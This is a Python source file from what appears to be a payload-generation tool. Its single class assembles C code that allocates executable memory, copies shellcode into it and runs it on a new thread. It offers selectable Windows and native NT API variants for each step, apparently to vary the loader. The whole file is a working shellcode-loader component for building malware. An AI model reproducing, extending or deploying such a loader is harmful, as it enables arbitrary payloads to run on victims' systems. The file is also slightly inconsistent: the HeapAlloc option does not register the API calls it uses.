from string import Template

class shellcoderunner:
    def __init__(self, arguments):
        self.apicallsList = ['WaitForSingleObject', 'CloseHandle']
        self.allocation = 'VirtualAlloc'
        self.execution = 'CreateThread'
        self.copy = 'memcpy'
        if 'allocation' in arguments:
            self.allocation = arguments['allocation']
        if 'execution' in arguments:
            self.execution = arguments['execution']
        if 'copy' in arguments:
            self.copy = arguments['copy']
        if self.allocation == 'VirtualAlloc':
            self.allocationCode = """
    LPVOID buffer = {VirtualAlloc}(NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
"""
            self.freeCode = """
    {VirtualFree}(buffer, 0, MEM_RELEASE);
"""
            self.apicallsList += ['VirtualAlloc', 'VirtualFree']
        elif self.allocation == 'HeapAlloc':
            self.allocationCode = """
    HANDLE hHeap = {HeapCreate}(HEAP_CREATE_ENABLE_EXECUTE, {shellcodeSize}, 0);
    LPVOID buffer = {HeapAlloc}(hHeap, HEAP_ZERO_MEMORY, {shellcodeSize});
"""
            self.freeCode = """
    {HeapFree}(hHeap, 0, buffer);
    {HeapDestroy}(hHeap);
"""
        elif self.allocation == 'NtAllocateVirtualMemory':
            self.allocationCode = """
    PVOID buffer = NULL;
    SIZE_T allocationSize = {shellcodeSize};
    {NtAllocateVirtualMemory}((HANDLE)-1, &buffer, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
"""
            self.freeCode = """
    {VirtualFree}(buffer, 0, MEM_RELEASE);
"""
            self.apicallsList += ['NtAllocateVirtualMemory', 'VirtualFree']
        if self.execution == 'CreateThread':
            self.executionCode = """
    HANDLE hThread = {CreateThread}(NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
"""
            self.apicallsList += ['CreateThread']
        elif self.execution == 'NtCreateThreadEx':
            self.executionCode = """
    HANDLE hThread;
    {NtCreateThreadEx}(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)buffer, NULL, FALSE, 0, 0, 0, NULL);
"""
            self.apicallsList += ['NtCreateThreadEx']
        if self.copy == 'memcpy':
            self.copyCode = """
    memcpy(buffer, shellcode, {shellcodeSize});
"""
        elif self.copy == 'NtWriteVirtualMemory':
            self.copyCode = """
    SIZE_T bytesWritten = 0;
    {NtWriteVirtualMemory}((HANDLE)-1, buffer, shellcode, {shellcodeSize}, &bytesWritten);
"""
            self.apicallsList += ['NtWriteVirtualMemory']


    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>"]

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def apicalls(self) -> list[str]:
        return self.apicallsList

    def template(self) -> str:
        return Template("""
    {transformers}
    // Allocate a region of RWX memory for shellcode
    $allocation

    // Copy our shellcode into memory that we just allocated (inside of our current process)
    $copy

    // Create thread to run shellcode
    $execution

    // Wait for thread to finish
    {WaitForSingleObject}(hThread, INFINITE);
    {CloseHandle}(hThread);

    // Clean up by freeing the memory we allocated for our shellcode
    $free
""").substitute(allocation=self.allocationCode, free=self.freeCode, execution=self.executionCode, copy=self.copyCode)